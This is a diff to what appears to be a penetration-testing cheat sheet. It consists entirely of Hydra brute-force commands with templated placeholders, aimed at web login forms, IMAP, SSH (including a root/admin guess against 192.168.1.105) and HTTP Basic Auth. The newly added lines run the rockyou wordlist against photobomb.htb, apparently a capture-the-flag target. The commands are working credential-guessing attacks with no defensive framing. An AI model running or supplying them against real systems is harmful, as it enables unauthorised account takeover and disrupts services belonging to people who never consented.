@@ -1,10 +1,15 @@
-# Brute login post form
+# Login post form
     hydra -l <username> -P <wordlist> <host> http-post-form "/:username=^USER^&password=^PASS^:F=<incorrect login message>" -V
 
-# Brute IMAP
+# IMAP
     hydra -L <userslist> -P <wordlist> imap://<host>
 
 
-# Brute SSH
+# SSH
     hydra -l root -p admin 192.168.1.105 -t 4 ssh
     hydra -L <userslist> -P <wordlist> ssh://<host>
+
+
+# HTTP Basic Auth
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt photobomb.htb http-get /printer/
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://photobomb.htb:80/printer/
